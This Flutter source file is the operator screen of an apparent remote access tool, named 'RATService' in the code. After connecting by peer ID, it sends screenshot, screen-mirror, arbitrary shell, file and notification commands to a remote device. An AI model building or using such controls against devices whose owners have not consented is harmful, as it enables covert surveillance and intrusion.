import 'package:flutter/material.dart';
import 'package:provider/provider.dart';
import '../services/rat_service.dart';

class ControllerScreen extends StatefulWidget {
  const ControllerScreen({super.key});

  @override
  State<ControllerScreen> createState() => _ControllerScreenState();
}

class _ControllerScreenState extends State<ControllerScreen> {
  final TextEditingController _peerIdController = TextEditingController();

  @override
  Widget build(BuildContext context) {
    final service = Provider.of<RATService>(context);

    return SingleChildScrollView(
      padding: const EdgeInsets.all(24),
      child: Column(
        children: [
          const Icon(Icons.gamepad, size: 80, color: Color(0xFF7c5cfc)),
          const SizedBox(height: 20),
          const Text(
            'Controller Mode',
            style: TextStyle(fontSize: 24, fontWeight: FontWeight.bold, color: Colors.white),
          ),
          const SizedBox(height: 20),
          TextField(
            controller: _peerIdController,
            style: const TextStyle(color: Colors.white),
            decoration: InputDecoration(
              hintText: 'Enter Device Peer ID',
              hintStyle: const TextStyle(color: Colors.grey),
              filled: true,
              fillColor: const Color(0xFF1a1a2e),
              border: OutlineInputBorder(
                borderRadius: BorderRadius.circular(12),
                borderSide: const BorderSide(color: Color(0xFF2a2a4a)),
              ),
              enabledBorder: OutlineInputBorder(
                borderRadius: BorderRadius.circular(12),
                borderSide: const BorderSide(color: Color(0xFF2a2a4a)),
              ),
            ),
          ),
          const SizedBox(height: 16),
          ElevatedButton(
            onPressed: () {
              final id = _peerIdController.text.trim();
              if (id.isNotEmpty) service.connect(id);
            },
            style: ElevatedButton.styleFrom(
              backgroundColor: const Color(0xFF7c5cfc),
              padding: const EdgeInsets.symmetric(horizontal: 40, vertical: 16),
              shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(30)),
            ),
            child: service.isLoading
                ? const SizedBox(
                    width: 20,
                    height: 20,
                    child: CircularProgressIndicator(color: Colors.white, strokeWidth: 2),
                  )
                : const Text('Connect', style: TextStyle(color: Colors.white)),
          ),
          const SizedBox(height: 20),
          if (service.isConnected) ...[
            const Text(
              '✅ Connected',
              style: TextStyle(color: Colors.green, fontSize: 16),
            ),
            const SizedBox(height: 20),
            Wrap(
              spacing: 10,
              runSpacing: 10,
              children: [
                _buildCommandButton('📸 Screenshot', () => service.sendCommand('screenshot')),
                _buildCommandButton('🖥️ Mirror', () => service.sendCommand('start_mirror')),
                _buildCommandButton('⏹️ Stop', () => service.sendCommand('stop_mirror'), color: Colors.red),
                _buildCommandButton('💻 Shell', () => _showShellDialog(context, service)),
                _buildCommandButton('📁 File', () => service.sendCommand('file_picker')),
                _buildCommandButton('🔔 Notify', () => _showNotifyDialog(context, service)),
              ],
            ),
          ],
        ],
      ),
    );
  }

  Widget _buildCommandButton(String label, VoidCallback onPressed, {Color color = const Color(0xFF7c5cfc)}) {
    return ElevatedButton(
      onPressed: onPressed,
      style: ElevatedButton.styleFrom(
        backgroundColor: color,
        padding: const EdgeInsets.symmetric(horizontal: 16, vertical: 12),
        shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(20)),
      ),
      child: Text(label, style: const TextStyle(color: Colors.white, fontSize: 12)),
    );
  }

  void _showShellDialog(BuildContext context, RATService service) {
    showDialog(
      context: context,
      builder: (_) => AlertDialog(
        backgroundColor: const Color(0xFF1a1a2e),
        title: const Text('Shell Command', style: TextStyle(color: Colors.white)),
        content: TextField(
          style: const TextStyle(color: Colors.white),
          decoration: const InputDecoration(
            hintText: 'Enter command',
            hintStyle: TextStyle(color: Colors.grey),
            border: OutlineInputBorder(),
          ),
          onSubmitted: (cmd) {
            service.sendCommand('shell', cmd);
            Navigator.pop(_);
          },
        ),
        actions: [
          TextButton(
            onPressed: () => Navigator.pop(_),
            child: const Text('Cancel', style: TextStyle(color: Colors.grey)),
          ),
          TextButton(
            onPressed: () {
              // Send command
              Navigator.pop(_);
            },
            child: const Text('Send', style: TextStyle(color: Color(0xFF7c5cfc))),
          ),
        ],
      ),
    );
  }

  void _showNotifyDialog(BuildContext context, RATService service) {
    showDialog(
      context: context,
      builder: (_) => AlertDialog(
        backgroundColor: const Color(0xFF1a1a2e),
        title: const Text('Notification', style: TextStyle(color: Colors.white)),
        content: TextField(
          style: const TextStyle(color: Colors.white),
          decoration: const InputDecoration(
            hintText: 'Enter message',
            hintStyle: TextStyle(color: Colors.grey),
            border: OutlineInputBorder(),
          ),
          onSubmitted: (msg) {
            service.sendCommand('notification', msg);
            Navigator.pop(_);
          },
        ),
        actions: [
          TextButton(
            onPressed: () => Navigator.pop(_),
            child: const Text('Cancel', style: TextStyle(color: Colors.grey)),
          ),
          TextButton(
            onPressed: () {
              // Send notification
              Navigator.pop(_);
            },
            child: const Text('Send', style: TextStyle(color: Color(0xFF7c5cfc))),
          ),
        ],
      ),
    );
  }
}
